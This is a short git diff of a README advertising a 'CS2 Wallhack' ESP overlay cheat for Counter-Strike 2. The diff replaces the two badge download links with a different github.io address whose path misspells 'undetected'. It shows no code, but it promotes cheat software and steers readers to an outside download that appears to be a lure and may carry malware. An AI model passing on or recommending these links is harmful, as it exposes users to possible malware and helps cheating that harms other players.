@@ -1,7 +1,7 @@
 # 🧱 CS2 Wallhack — ESP Overlay Visual Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-red?style=for-the-badge)](https://undetected-cs2-wallhack.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=counter-strike)](https://undetected-cs2-wallhack.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-red?style=for-the-badge)](https://edavydenko666.github.io/.github/undetekted-cs2-tools)  
+[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=counter-strike)](https://edavydenko666.github.io/.github/undetekted-cs2-tools)
 
 ---
 
